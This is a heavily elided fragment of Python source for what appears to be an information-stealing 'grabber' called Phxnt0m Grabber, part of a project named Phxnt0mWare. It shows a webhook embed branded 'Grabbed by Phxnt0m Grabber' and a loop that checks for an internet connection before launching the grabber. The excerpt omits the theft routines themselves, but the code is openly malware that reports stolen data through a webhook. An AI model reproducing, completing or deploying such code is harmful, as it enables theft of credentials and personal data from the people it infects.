  ...
  "embeds": [
    {
      ...
      "url": "https://github.com/Phxnt0m1/Phxnt0mWare",
      "color": 2303786,
      "footer": {
        "text": "Grabbed by Phxnt0m Grabber | https://github.com/Phxnt0m1/Phxnt0mWare"
      },
      "thumbnail": {
        "url": image_url
      }
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    Phxnt0mGrabber() # Start the grabber
